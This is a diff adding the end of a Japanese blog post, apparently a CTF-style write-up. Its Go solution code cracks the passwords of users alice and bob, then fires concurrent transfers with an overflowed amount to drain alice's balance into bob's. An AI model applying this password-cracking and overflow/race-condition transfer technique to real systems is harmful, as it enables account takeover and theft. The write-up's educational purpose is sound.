+    <span class="nb">panic</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"could not crack password for user %s"</span><span class="p">,</span> <span class="n">u</span><span class="o">.</span><span class="n">Id</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">wg</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span><span class="p">{}</span>
+    <span class="n">wg</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="m">2</span><span class="p">)</span>
+
+    <span class="n">alice</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">User</span><span class="p">{</span><span class="n">Id</span><span class="o">:</span> <span class="s">"alice"</span><span class="p">}</span>
+    <span class="n">bob</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">User</span><span class="p">{</span><span class="n">Id</span><span class="o">:</span> <span class="s">"bob"</span><span class="p">}</span>
+    <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">clackPwd</span><span class="p">(</span><span class="n">alice</span><span class="p">)</span>
+        <span class="n">wg</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
+    <span class="p">}()</span>
+
+    <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">clackPwd</span><span class="p">(</span><span class="n">bob</span><span class="p">)</span>
+        <span class="n">wg</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
+    <span class="p">}()</span>
+    <span class="n">wg</span><span class="o">.</span><span class="n">Wait</span><span class="p">()</span>
+
+    <span class="n">offset</span> <span class="o">:=</span> <span class="o">-</span><span class="m">1</span> <span class="o">&lt;&lt;</span> <span class="m">63</span>
+    <span class="n">amount</span> <span class="o">:=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="m">1000000</span><span class="p">)</span>
+    <span class="n">count</span> <span class="o">:=</span> <span class="m">10</span>
+    <span class="n">wg2</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span><span class="p">{}</span>
+    <span class="n">wg2</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
+        <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
+            <span class="n">transfer</span><span class="p">(</span><span class="n">alice</span><span class="p">,</span> <span class="n">bob</span><span class="p">,</span> <span class="n">amount</span><span class="p">)</span>
+            <span class="n">wg2</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
+        <span class="p">}()</span>
+    <span class="p">}</span>
+
+    <span class="n">wg2</span><span class="o">.</span><span class="n">Wait</span><span class="p">()</span>
+
+    <span class="n">ans</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">balance</span><span class="p">(</span><span class="n">bob</span><span class="p">)</span>
+    <span class="nb">println</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="o">...</span>
+</code></pre>
+</div>
+<h1 id="%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB"><a class="headerlink" href="#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB">おわりに</a></h1>
+<p>aliceさんはマイナス残高を清算してください｡</p>
+          </div>
+        </article>
+
+      </div>
+    </div>
+    <footer>
+      <div class="pagination btn-group" style="text-align: center; font-family: 'Comfortaa';">
+        <a class="btn prev" href="/2023/05/06/purely-functioinal-ocaml-development.html" title="OCaml環境をNixでセットアップしてGitHub Actionsでopamに楽にパッケージを上げる">← Prev</a>
+        /<a class="btn" href="/">Top</a>/
+        <a class="btn next" href="/2023/11/27/go-algebraic-effects.html" title="From Goroutines to Coroutines: goroutines+channelsから考えるコルーチンの分類">Next →</a>
+      </div>
+    </footer>
+
+  </body>
+</html>
